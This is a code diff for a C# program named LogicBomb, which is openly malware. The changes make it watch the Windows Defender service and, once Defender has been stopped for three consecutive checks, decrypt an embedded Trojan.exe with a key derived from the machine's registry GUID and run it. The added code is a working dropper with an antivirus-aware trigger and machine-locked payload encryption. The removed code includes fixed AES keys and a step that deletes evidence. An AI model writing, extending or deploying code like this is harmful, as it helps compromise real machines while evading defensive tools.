@@ -1,12 +1,14 @@
 using System;
-using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
+using System.ServiceProcess;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using Microsoft.Win32;
 
 namespace LogicBomb
 {
@@ -15,41 +17,27 @@ namespace LogicBomb
         private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
         private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");
 
-        private const string TriggerName = "trigger.flag";
-        private const string RequiredToken = "ALLOW_TRIGGER";
         private const string MarkerName = "activated.txt";
         private const string EncryptedBombName = "bomb.encrypted";
         private const string DecryptedTrojanName = "Trojan.exe";
+        private const string DefenderServiceName = "WinDefend";
 
-        private const int DebounceMs = 1000;
-        private const int FileReadyTimeoutSec = 5;
+        private const int CheckIntervalSeconds = 10;
+        private const int ConsecutiveChecksRequired = 3;
 
-        // AES encryption keys (will be replaced by Builder)
-        private static readonly byte[] AES_KEY = new byte[] { 0x49, 0xB2, 0x6E, 0x43, 0x84, 0x2E, 0x12, 0xBB, 0xCC, 0xD4, 0xEB, 0xCC, 0xDD, 0xF9, 0xDF, 0x0F, 0x8D, 0x22, 0x60, 0x4F, 0x46, 0xC2, 0x6C, 0x80, 0xD2, 0x78, 0x2B, 0x40, 0xB5, 0x94, 0xDF, 0x2E };
-        private static readonly byte[] AES_IV = new byte[] { 0xBA, 0x3E, 0x7D, 0xC9, 0xDC, 0xFA, 0x29, 0x67, 0x1C, 0x6D, 0xE6, 0x04, 0x22, 0x4C, 0x5C, 0x23 };
-
-        private static FileSystemWatcher watcher;
-        private static ConcurrentDictionary<string, DateTime> pending = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);
-        private static CancellationTokenSource cts = new CancellationTokenSource();
         private static string logFile;
+        private static CancellationTokenSource cts = new CancellationTokenSource();
+        private static int consecutiveDownChecks = 0;
+        private static bool lastDefenderStatus = true; // Assume running initially
 
         static void Main(string[] args)
         {
-            Console.WriteLine("[LogicBomb] START (AES Encrypted Mode) - Press Ctrl+C to stop");
+            Console.WriteLine("[LogicBomb] START (Polymorphic + Defender Monitor) - Press Ctrl+C to stop");
             Directory.CreateDirectory(ResultDir);
             logFile = Path.Combine(ResultDir, "logicbomb_log.jsonl");
 
-            watcher = new FileSystemWatcher(ExecutableBaseDir)
-            {
-                NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.CreationTime | NotifyFilters.Size,
-                Filter = "*.*",
-                IncludeSubdirectories = false,
-                EnableRaisingEvents = true
-            };
-
-            watcher.Created += (s, e) => Enqueue(e.FullPath, "Created");
-            watcher.Changed += (s, e) => Enqueue(e.FullPath, "Changed");
-            watcher.Renamed += (s, e) => Enqueue(e.FullPath, "Renamed");
+            LogEvent("startup", ExecutableBaseDir, "process_started",
+                $"PID:{Process.GetCurrentProcess().Id},User:{Environment.UserName}");
 
             Console.CancelKeyPress += (s, e) =>
             {
@@ -58,161 +46,126 @@ namespace LogicBomb
                 cts.Cancel();
             };
 
-            var worker = Task.Run(() => ProcessLoop(cts.Token));
-
-            Console.WriteLine($"[LogicBomb] Watching: {ExecutableBaseDir}");
-            Console.WriteLine($"[LogicBomb] Waiting for file '{TriggerName}' containing token '{RequiredToken}'");
+            Console.WriteLine($"[LogicBomb] Watching Windows Defender service: {DefenderServiceName}");
+            Console.WriteLine($"[LogicBomb] Check interval: {CheckIntervalSeconds} seconds");
+            Console.WriteLine($"[LogicBomb] Trigger after {ConsecutiveChecksRequired} consecutive 'down' checks");
+            Console.WriteLine();
 
             try
             {
-                worker.Wait();
+                MonitorDefenderLoop(cts.Token).Wait();
             }
             finally
             {
-                watcher?.Dispose();
                 cts?.Dispose();
             }
 
             Console.WriteLine("[LogicBomb] Exiting.");
         }
 
-        private static void Enqueue(string path, string ev)
-        {
-            try
-            {
-                if (string.IsNullOrEmpty(path))
-                {
-                    LogEvent("error", null, ev, "null or empty path");
-                    return;
-                }
-
-                if (!string.Equals(Path.GetFileName(path), TriggerName, StringComparison.OrdinalIgnoreCase))
-                    return;
-
-                pending[path] = DateTime.UtcNow;
-                LogEvent("enqueue", path, ev, null);
-                Console.WriteLine($"[LogicBomb] Event {ev} -> enqueue: {path}");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[LogicBomb] Enqueue error for {path}: {ex.Message}");
-                LogEvent("error", path, "enqueue_failed", ex.Message);
-            }
-        }
-
-        private static void LogEvent(string type, string path, string ev, string note)
-        {
-            try
-            {
-                var obj = new Dictionary<string, string>
-                {
-                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
-                    ["type"] = type ?? "unknown",
-                    ["event"] = ev ?? "none",
-                    ["path"] = path ?? "null",
-                    ["note"] = note ?? "none"
-                };
-                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";
-
-                // Retry logic for file access conflicts
-                int retries = 3;
-                while (retries > 0)
-                {
-                    try
-                    {
-                        File.AppendAllText(logFile, json + Environment.NewLine);
-                        break;
-                    }
-                    catch (IOException) when (retries > 1)
-                    {
-                        retries--;
-                        Thread.Sleep(50);
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[LogicBomb] Logging failed: {ex.Message}");
-            }
-        }
-
-        private static string Escape(string s)
-        {
-            return s?.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n") ?? "";
-        }
-
-        private static async Task ProcessLoop(CancellationToken token)
+        private static async Task MonitorDefenderLoop(CancellationToken token)
         {
             try
             {
                 while (!token.IsCancellationRequested)
                 {
-                    var now = DateTime.UtcNow;
-                    var ready = pending.Where(kv => (now - kv.Value).TotalMilliseconds >= DebounceMs)
-                                       .Select(kv => kv.Key)
-                                       .ToArray();
-                    foreach (var path in ready)
+                    bool defenderRunning = IsDefenderRunning();
+
+                    // Log status changes only
+                    if (defenderRunning != lastDefenderStatus)
                     {
-                        DateTime removed;
-                        pending.TryRemove(path, out removed);
-                        await Task.Run(() => HandleTrigger(path));
+                        if (defenderRunning)
+                        {
+                            LogWarning("Windows Defender service is now RUNNING");
+                            LogEvent("defender_status", DefenderServiceName, "status_change", "running");
+                            consecutiveDownChecks = 0;
+                        }
+                        else
+                        {
+                            LogWarning("Windows Defender service is now STOPPED");
+                            LogEvent("defender_status", DefenderServiceName, "status_change", "stopped");
+                        }
+                        lastDefenderStatus = defenderRunning;
                     }
-                    await Task.Delay(300, token);
+
+                    // Count consecutive down checks
+                    if (!defenderRunning)
+                    {
+                        consecutiveDownChecks++;
+                        Console.WriteLine($"[LogicBomb] Defender down - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");
+
+                        if (consecutiveDownChecks >= ConsecutiveChecksRequired)
+                        {
+                            LogWarning($"Defender has been down for {ConsecutiveChecksRequired} consecutive checks. TRIGGERING PAYLOAD!");
+                            LogEvent("trigger", DefenderServiceName, "trigger_activated", $"defender_down_{ConsecutiveChecksRequired}_checks");
+
+                            TriggerPayload();
+                            break; // Exit after triggering
+                        }
+                    }
+                    else
+                    {
+                        // Reset counter if defender comes back up
+                        if (consecutiveDownChecks > 0)
+                        {
+                            consecutiveDownChecks = 0;
+                        }
+                    }
+
+                    await Task.Delay(CheckIntervalSeconds * 1000, token);
                 }
             }
-            catch (TaskCanceledException) { }
+            catch (TaskCanceledException)
+            {
+                Console.WriteLine("[LogicBomb] Monitoring cancelled.");
+            }
             catch (Exception ex)
             {
-                Console.WriteLine("[LogicBomb] Worker error: " + ex.Message);
+                LogError($"Monitor loop error: {ex.Message}");
+                LogEvent("error", "monitor_loop", "exception", ex.Message);
             }
         }
 
-        private static void HandleTrigger(string fullPath)
+        private static bool IsDefenderRunning()
         {
             try
             {
-                Console.WriteLine("[LogicBomb] Processing trigger: " + fullPath);
-                LogEvent("process_start", fullPath, "processing", null);
-
-                // Validate file path is within expected directory
-                string normalizedPath = Path.GetFullPath(fullPath);
-                string normalizedBase = Path.GetFullPath(ExecutableBaseDir);
-                if (!normalizedPath.StartsWith(normalizedBase, StringComparison.OrdinalIgnoreCase))
+                using (ServiceController sc = new ServiceController(DefenderServiceName))
                 {
-                    Console.WriteLine("[LogicBomb] Security: Trigger file outside base directory");
-                    LogEvent("security", fullPath, "path_traversal_attempt", null);
-                    return;
+                    return sc.Status == ServiceControllerStatus.Running;
                 }
+            }
+            catch (InvalidOperationException)
+            {
+                // Service doesn't exist
+                LogWarning($"Service '{DefenderServiceName}' not found on this system");
+                return false;
+            }
+            catch (Exception ex)
+            {
+                LogError($"Failed to check Defender status: {ex.Message}");
+                LogEvent("error", DefenderServiceName, "check_failed", ex.Message);
+                // Assume running on error to avoid false triggers
+                return true;
+            }
+        }
 
-                if (!WaitForFileReady(fullPath, TimeSpan.FromSeconds(FileReadyTimeoutSec)))
-                {
-                    Console.WriteLine("[LogicBomb] File not ready within timeout: " + fullPath);
-                    LogEvent("error", fullPath, "not_ready", "timeout waiting for file ready");
-                    return;
-                }
+        private static void TriggerPayload()
+        {
+            try
+            {
+                Console.WriteLine("[LogicBomb] === PAYLOAD TRIGGERED ===");
+                LogEvent("trigger_start", ExecutableBaseDir, "payload_activation", null);
 
-                // Check file size to prevent reading huge files
-                var fileInfo = new FileInfo(fullPath);
-                if (fileInfo.Length > 1024 * 1024) // 1MB limit
-                {
-                    Console.WriteLine($"[LogicBomb] Trigger file too large: {fileInfo.Length} bytes");
-                    LogEvent("error", fullPath, "file_too_large", $"{fileInfo.Length} bytes");
-                    return;
-                }
-
-                string content = File.ReadAllText(fullPath);
-
-                if (string.IsNullOrEmpty(content) || content.IndexOf(RequiredToken, StringComparison.OrdinalIgnoreCase) < 0)
-                {
-                    Console.WriteLine("[LogicBomb] Trigger does not contain a valid token. Skipping.");
-                    LogEvent("skipped", fullPath, "invalid_token", null);
-                    return;
-                }
-
-                // Create marker file inside "result"
+                // Create marker file
                 string markerPath = Path.Combine(ResultDir, MarkerName);
-                File.WriteAllText(markerPath, $"Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
-                Console.WriteLine("[LogicBomb] Creating marker: " + markerPath);
+                File.WriteAllText(markerPath,
+                    $"Activated by Windows Defender going down at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
+                Console.WriteLine("[LogicBomb] Created marker: " + markerPath);
+
+                // Get local machine GUID and derive keys
+                string machineGuid = CryptoUtils.GetMachineGuid();
+                LogInfo($"Local Machine GUID: {machineGuid}");
 
                 // Decrypt and execute encrypted Trojan
                 string encryptedBombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
@@ -224,9 +177,9 @@ namespace LogicBomb
                     {
                         Console.WriteLine($"[LogicBomb] Found encrypted payload: {encryptedBombPath}");
 
-                        // Decrypt Trojan.exe
+                        // Decrypt Trojan.exe using machine-specific key
                         string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
-                        DecryptFile(encryptedBombPath, decryptedTrojanPath);
+                        CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, machineGuid);
 
                         Console.WriteLine($"[LogicBomb] Decrypted payload to: {decryptedTrojanPath}");
                         LogEvent("decrypted", encryptedBombPath, "decrypted_to", decryptedTrojanPath);
@@ -257,15 +210,13 @@ namespace LogicBomb
                 }
                 else
                 {
-                    Console.WriteLine($"[LogicBomb] {EncryptedBombName} not found in program directory. Skipping.");
-                    LogEvent("info", fullPath, "no_encrypted_bomb", null);
+                    Console.WriteLine($"[LogicBomb] {EncryptedBombName} not found in program directory.");
+                    LogEvent("error", ExecutableBaseDir, "no_encrypted_bomb", null);
                 }
 
                 if (executableToRun != null)
                 {
                     Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
-
-                    // Log final state before exit
                     LogEvent("final", executableToRun, "about_to_exit", "payload launched successfully");
 
                     var psi = new ProcessStartInfo
@@ -278,16 +229,9 @@ namespace LogicBomb
 
                     try
                     {
-                        // Delete trigger file to remove evidence
-                        if (File.Exists(fullPath))
-                        {
-                            File.Delete(fullPath);
-                            Console.WriteLine("[LogicBomb] Deleted trigger file");
-                        }
-
                         Process.Start(psi);
                         LogEvent("launched", executableToRun, "launched", null);
-                        Console.WriteLine("[LogicBomb] Executable started. Exiting main app.");
+                        Console.WriteLine("[LogicBomb] Trojan.exe started. Exiting LogicBomb.");
                         Environment.Exit(0);
                     }
                     catch (Exception ex)
@@ -296,20 +240,156 @@ namespace LogicBomb
                         LogEvent("error", executableToRun, "launch_failed", ex.Message);
                     }
                 }
+                else
+                {
+                    LogError("Payload trigger failed - no executable to run");
+                }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[LogicBomb] HandleTrigger error: " + ex.Message);
-                LogEvent("error", fullPath, "handle_error", ex.Message);
+                Console.WriteLine("[LogicBomb] TriggerPayload error: " + ex.Message);
+                LogEvent("error", "trigger_payload", "exception", ex.Message);
             }
         }
 
-        private static void DecryptFile(string inputFile, string outputFile)
+        private static void LogEvent(string type, string path, string ev, string note)
         {
+            try
+            {
+                var obj = new Dictionary<string, string>
+                {
+                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
+                    ["type"] = type ?? "unknown",
+                    ["event"] = ev ?? "none",
+                    ["path"] = path ?? "null",
+                    ["note"] = note ?? "none"
+                };
+                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";
+
+                int retries = 3;
+                while (retries > 0)
+                {
+                    try
+                    {
+                        File.AppendAllText(logFile, json + Environment.NewLine);
+                        break;
+                    }
+                    catch (IOException) when (retries > 1)
+                    {
+                        retries--;
+                        Thread.Sleep(50);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[LogicBomb] Logging failed: {ex.Message}");
+            }
+        }
+
+        private static string Escape(string s)
+        {
+            return s?.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n") ?? "";
+        }
+
+        private static void LogInfo(string message)
+        {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.Write("[INFO] ");
+            Console.ResetColor();
+            Console.WriteLine(message);
+        }
+
+        private static void LogWarning(string message)
+        {
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.Write("[WARNING] ");
+            Console.ResetColor();
+            Console.WriteLine(message);
+        }
+
+        private static void LogError(string message)
+        {
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.Write("[ERROR] ");
+            Console.ResetColor();
+            Console.WriteLine(message);
+        }
+    }
+
+    // Embedded CryptoUtils class
+    public static class CryptoUtils
+    {
+        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
+        private const string IV_SALT = "_IV_SALT_2025";
+
+        public static string GetMachineGuid()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
+                {
+                    if (key != null)
+                    {
+                        object guidValue = key.GetValue("MachineGuid");
+                        if (guidValue != null)
+                        {
+                            string guid = guidValue.ToString();
+                            if (!string.IsNullOrEmpty(guid))
+                            {
+                                Console.WriteLine($"[CryptoUtils] Machine GUID: {guid}");
+                                return guid;
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
+            }
+
+            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
+            return DEFAULT_MACHINE_ID;
+        }
+
+        public static byte[] DeriveKeyFromMachineId(string machineId)
+        {
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
+                byte[] hash = sha.ComputeHash(inputBytes);
+
+                byte[] key = new byte[32];
+                Array.Copy(hash, key, 32);
+
+                return key;
+            }
+        }
+
+        public static byte[] DeriveIVFromMachineId(string machineId)
+        {
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
+                byte[] hash = sha.ComputeHash(inputBytes);
+
+                byte[] iv = new byte[16];
+                Array.Copy(hash, iv, 16);
+
+                return iv;
+            }
+        }
+
+        public static void DecryptFile(string inputFile, string outputFile, string machineId)
+        {
+            byte[] key = DeriveKeyFromMachineId(machineId);
+            byte[] iv = DeriveIVFromMachineId(machineId);
+
             using (Aes aes = Aes.Create())
             {
-                aes.Key = AES_KEY;
-                aes.IV = AES_IV;
+                aes.Key = key;
+                aes.IV = iv;
 
                 using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                 using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
@@ -318,45 +398,6 @@ namespace LogicBomb
                     cs.CopyTo(fsOutput);
                 }
             }
-        }
-
-        private static bool WaitForFileReady(string path, TimeSpan timeout)
-        {
-            if (!File.Exists(path))
-            {
-                Console.WriteLine($"[LogicBomb] File does not exist: {path}");
-                return false;
-            }
-
-            var sw = Stopwatch.StartNew();
-            while (sw.Elapsed < timeout)
-            {
-                try
-                {
-                    using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.None))
-                    {
-                        if (fs.Length > 0)
-                        {
-                            Console.WriteLine($"[LogicBomb] File ready: {path} ({fs.Length} bytes)");
-                            return true;
-                        }
-                    }
-                }
-                catch (IOException)
-                {
-                    // File still being written
-                }
-                catch (UnauthorizedAccessException)
-                {
-                    Console.WriteLine($"[LogicBomb] Access denied to file: {path}");
-                    return false;
-                }
-
-                Thread.Sleep(100);
-            }
-
-            Console.WriteLine($"[LogicBomb] Timeout waiting for file: {path}");
-            return false;
         }
     }
 }
